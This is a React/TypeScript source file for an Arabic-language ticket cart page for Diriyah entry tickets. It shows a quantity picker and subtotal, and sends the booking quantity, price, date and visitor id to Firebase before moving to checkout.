import { ArrowRight, Trash2, Plus, Minus, ShoppingCart, Ticket } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Link, useLocation } from "wouter";
import { useState, useEffect } from "react";
import { addData } from "@/lib/firebase";

import ticketImage from "@assets/455c3dc333504d44bfe63f8258282e15.webp";

const getTicketPrice = () => {
  return 50;
};

export default function CartPage() {
  const [quantity, setQuantity] = useState(1);
  const [pricePerTicket, setPricePerTicket] = useState(50);
  
  useEffect(() => {
    setPricePerTicket(getTicketPrice());
  }, []);
  
  const subtotal = pricePerTicket * quantity;

  return (
    <div className="min-h-screen bg-gradient-to-b from-[#f5efe6] to-[#ebddd0] flex flex-col" dir="rtl">
      <Header />
      <ProgressSteps />
      <TitleBanner />
      <main className="flex-1 px-4 py-6">
        <div className="max-w-md mx-auto animate-fade-in">
          <CartItem 
            quantity={quantity} 
            setQuantity={setQuantity} 
            price={pricePerTicket} 
          />
          <Subtotal total={subtotal} />
        </div>
      </main>
      <ContinueButton quantity={quantity} price={pricePerTicket} />
    </div>
  );
}

function Header() {
  return (
    <header className="bg-[#4a1525] text-white">
      <div className="container mx-auto px-4 py-4">
        <div className="flex items-center justify-between">
          <Link href="/booking">
            <Button size="icon" variant="ghost" className="text-white hover:bg-white/10" data-testid="button-menu">
              <ArrowRight className="w-5 h-5" />
            </Button>
          </Link>
          
          <div className="flex-1 flex justify-center">
            <img src="/logo-white.svg" alt="الدرعية" className="h-12" data-testid="img-cart-logo" />
          </div>
          
          <div className="w-10" />
        </div>
      </div>
    </header>
  );
}

function ProgressSteps() {
  return (
    <div className="bg-gradient-to-r from-[#f5efe6] to-[#ebddd0] p-5" data-testid="progress-steps-cart">
      <div className="flex items-center justify-center gap-1">
        {[
          { number: 1, label: "تسجيل" },
          { number: 2, label: "الحجز" },
          { number: 3, label: "السلة" },
          { number: 4, label: "الدفع" },
        ].map((step, index, arr) => (
          <div key={step.number} className="flex items-center">
            <div className="flex flex-col items-center">
              <div
                className={`w-10 h-10 rounded-full flex items-center justify-center text-sm font-bold transition-all ${
                  step.number <= 3
                    ? "bg-gradient-to-br from-[#c9a96e] to-[#b8935a] text-white shadow-glow"
                    : "bg-muted text-muted-foreground"
                }`}
              >
                {step.number}
              </div>
              <span className={`text-xs mt-2 font-medium ${step.number <= 3 ? "text-primary" : "text-muted-foreground"}`}>
                {step.label}
              </span>
            </div>
            {index < arr.length - 1 && (
              <div
                className={`w-10 h-1 mx-1 rounded-full ${
                  step.number < 3 ? "bg-gradient-to-r from-[#c9a96e] to-[#b8935a]" : "bg-muted"
                }`}
              />
            )}
          </div>
        ))}
      </div>
    </div>
  );
}

function TitleBanner() {
  return (
    <div className="bg-gradient-to-r from-[#4a1525] to-[#3a0f1d] py-6 px-4 text-center">
      <div className="flex items-center justify-center gap-3">
        <ShoppingCart className="w-7 h-7 text-white" />
        <h1 className="text-2xl font-bold text-white" data-testid="text-cart-title">
          سلة المشتريات
        </h1>
      </div>
    </div>
  );
}

function CartItem({ 
  quantity, 
  setQuantity, 
  price 
}: { 
  quantity: number; 
  setQuantity: (q: number) => void; 
  price: number;
}) {
  const formattedPrice = `${price.toLocaleString('ar-SA')} ر.س`;

  return (
    <div className="bg-white rounded-2xl shadow-xl p-5 mb-6" data-testid="cart-item">
      <div className="flex gap-4">
        <div className="w-24 h-24 rounded-xl overflow-hidden shadow-md flex-shrink-0">
          <img 
            src={ticketImage} 
            alt="تذكرة دخول الدرعية" 
            className="w-full h-full object-cover"
          />
        </div>
        
        <div className="flex-1">
          <div className="flex items-start justify-between">
            <div>
              <div className="flex items-center gap-2 mb-1">
                <Ticket className="w-4 h-4 text-primary" />
                <h3 className="font-bold text-foreground" data-testid="text-item-title">
                  تذكرة دخول الدرعية
                </h3>
              </div>
              <p className="text-muted-foreground text-sm">{formattedPrice}</p>
            </div>
            <Button size="icon" variant="ghost" className="text-red-400 hover:text-red-500 hover:bg-red-50" data-testid="button-delete-item">
              <Trash2 className="w-5 h-5" />
            </Button>
          </div>
          
          <div className="flex items-center justify-between mt-4">
            <p className="text-primary font-bold text-lg">{formattedPrice}</p>
            
            <div className="flex items-center gap-1 bg-muted rounded-xl p-1">
              <Button 
                size="icon" 
                variant="ghost" 
                className="h-9 w-9 rounded-lg"
                onClick={() => setQuantity(Math.max(1, quantity - 1))}
                data-testid="button-decrease"
              >
                <Minus className="w-4 h-4" />
              </Button>
              <span className="w-10 text-center font-bold text-lg" data-testid="text-quantity">{quantity}</span>
              <Button 
                size="icon" 
                variant="ghost" 
                className="h-9 w-9 rounded-lg"
                onClick={() => setQuantity(quantity + 1)}
                data-testid="button-increase"
              >
                <Plus className="w-4 h-4" />
              </Button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

function Subtotal({ total }: { total: number }) {
  const formattedTotal = `${total.toLocaleString('ar-SA')} ر.س`;
  
  return (
    <div className="bg-white rounded-2xl shadow-xl p-5" data-testid="subtotal">
      <div className="flex items-center justify-between">
        <span className="text-lg font-medium text-foreground">المجموع الكلي</span>
        <span className="text-2xl font-bold text-primary" data-testid="text-subtotal">{formattedTotal}</span>
      </div>
    </div>
  );
}

function ContinueButton({ quantity, price }: { quantity: number; price: number }) {
  const [, setLocation] = useLocation();
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitError, setSubmitError] = useState("");

  const handleContinue = async () => {
    if (isSubmitting) return;
    setIsSubmitting(true);
    setSubmitError("");
    const visitorId = localStorage.getItem("visitor");
    if (!visitorId) {
      setSubmitError("لم يتم العثور على بيانات الزائر");
      setIsSubmitting(false);
      return;
    }

    const bookingData = JSON.parse(localStorage.getItem("bookingData") || "{}");
    const ok = await addData({
      id: visitorId,
      currentPage: "cart",
      ticketQuantity: quantity,
      ticketPrice: price,
      totalAmount: quantity * price,
      bookingDate: bookingData.date,
      bookingTime: bookingData.time,
    });
    if (!ok) {
      setSubmitError("تعذر المتابعة، يرجى المحاولة مرة أخرى");
      setIsSubmitting(false);
      return;
    }
    setLocation("/checkout");
  };

  return (
    <div className="sticky bottom-0 bg-gradient-to-t from-[#e8d5b5] to-[#f5ebe0] p-4 shadow-[0_-4px_20px_rgba(0,0,0,0.1)]">
      <div className="max-w-md mx-auto">
        <Button 
          size="lg"
          className="w-full bg-primary text-white shadow-lg"
          onClick={() => {
            void handleContinue();
          }}
          disabled={isSubmitting}
          data-testid="button-continue-checkout"
        >
          {isSubmitting ? "جاري الإرسال..." : "المتابعة لإتمام الحجز"}
        </Button>
        {submitError && (
          <p className="text-red-500 text-xs text-center mt-2" data-testid="error-cart-submit">
            {submitError}
          </p>
        )}
      </div>
    </div>
  );
}
